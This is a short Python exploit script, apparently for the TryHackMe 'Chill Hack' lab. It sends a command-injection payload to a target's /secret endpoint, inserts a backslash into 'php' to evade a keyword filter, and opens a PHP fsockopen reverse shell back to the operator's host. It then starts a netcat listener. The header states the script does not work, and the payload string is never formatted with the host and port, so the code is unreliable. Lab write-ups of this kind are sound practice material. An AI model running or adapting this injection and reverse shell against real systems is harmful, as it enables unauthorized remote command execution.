#Made on Mar 20 2023
#Created in python3
#DOES NOT WORK. I WILL PICK IT UP WHEN I HAVE THE CHANCE
#'Chill Hack' on tryhackme

import requests as req
import sys
import os
import socket

FileName = sys.argv[0]
host = sys.argv[1] #our host
port = sys.argv[2] #our port
tar = sys.argv[3] #our target

def nc():
    listen = f'nc -lnvp {port}'
    os.system(listen)

def main_function(): #executes the script below to establish the shell
    print(f"starting {FileName}")
    url = f'http://{tar}/secret'
    payload = {"command": """p\hp -r '$sock=fsockopen("{host}", {port});`sh <&3 >&3 2>&3`;'"""}
    post_data = req.post(url, data=payload)

    nc()

main_function()
